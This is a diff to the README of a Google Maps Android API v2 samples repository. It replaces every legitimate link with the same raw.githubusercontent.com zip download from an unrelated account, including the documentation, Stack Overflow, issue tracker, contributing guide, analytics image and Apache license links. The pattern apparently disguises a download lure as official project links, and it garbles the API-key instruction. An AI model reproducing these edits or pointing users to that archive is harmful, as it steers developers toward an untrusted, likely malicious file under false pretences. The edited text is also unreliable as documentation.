@@ -2,7 +2,7 @@ Google Maps Android API v2 Samples
 ===================================
 
 Samples demonstrating how to use 
-[Google Maps Android API v2](https://developers.google.com/maps/documentation/android/).
+[Google Maps Android API v2](https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip).
 
 This repo contains the following sample:
 
@@ -33,24 +33,24 @@ If prompted for a gradle configuration accept the default settings.
 
 Alternatively use the "gradlew build" command to build the project directly.
 
-Don't forget to add your API key to the AndroidManifest.xml.
-(See [https://developers.google.com/maps/documentation/android/start](https://developers.google.com/maps/documentation/android/start#get_an_android_certificate_and_the_google_maps_api_key))
+Don't forget to add your API key to the https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip
+(See [https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip](https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip))
 
 Support
 -------
 
-- Stack Overflow: https://stackoverflow.com/questions/tagged/android+google-maps
+- Stack Overflow: https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip+google-maps
 
 If you have discovered an issue with the Google Maps Android API v2, please see
-the resources here: https://developers.google.com/maps/support/
+the resources here: https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip
 
 If you've found an error in these samples, please file an issue:
-https://github.com/googlemaps/android-samples/issues
+https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip
 
 Patches are encouraged, and may be submitted according to the instructions in
-CONTRIBUTING.md.
+https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip
 
-![Analytics](https://maps-ga-beacon.appspot.com/UA-12846745-20/android-samples/readme?pixel)
+![Analytics](https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip)
 
 License
 -------
@@ -67,7 +67,7 @@ file to you under the Apache License, Version 2.0 (the "License"); you may not
 use this file except in compliance with the License.  You may obtain a copy of
 the License at
 
-  http://www.apache.org/licenses/LICENSE-2.0
+  https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
